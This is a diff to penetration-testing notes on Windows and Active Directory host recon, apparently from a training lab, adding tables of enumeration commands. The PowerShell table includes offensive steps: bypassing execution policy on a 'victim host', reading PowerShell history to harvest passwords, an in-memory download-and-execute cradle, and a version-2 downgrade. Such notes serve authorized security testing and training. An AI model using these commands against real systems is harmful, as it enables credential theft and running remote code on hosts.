@@ -5,7 +5,29 @@ Let's assume our client has asked us to test their AD environment from a managed
 ---
 ## Env Commands For Host & Network Recon
 
-```
-Import-Module ActiveDirectory
-PS C:\htb> Get-Module
-```
+
+| **Command**                                                                                               | **Result**                                                                                             |
+| --------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
+| `hostname`                                                                                                | Prints the PC's Name                                                                                   |
+| `[System.Environment]::OSVersion.Version`                                                                 | Prints out the OS version and revision level                                                           |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                                   | Prints the patches and hotfixes applied to the host                                                    |
+| `ipconfig /all`                                                                                           | Prints out network adapter state and configurations                                                    |
+| `set`                                                                                                     | Displays a list of environment variables for the current session (ran from CMD-prompt)                 |
+| `echo %USERDOMAIN%`                                                                                       | Displays the domain name to which the host belongs (ran from CMD-prompt)                               |
+| `echo %logonserver%`                                                                                      | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)             |
+| [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo). | can cover the information above with one command (put this command above since its the most important) |
+	
+
+The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information
+
+## Powershell
+
+| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                               |
+| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
+| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
+| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
+| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |
+| ```<br> powershell.exe -version 2<br>```                                                                                   | downgrade the powershell version                                                                                                                                                                                                              |
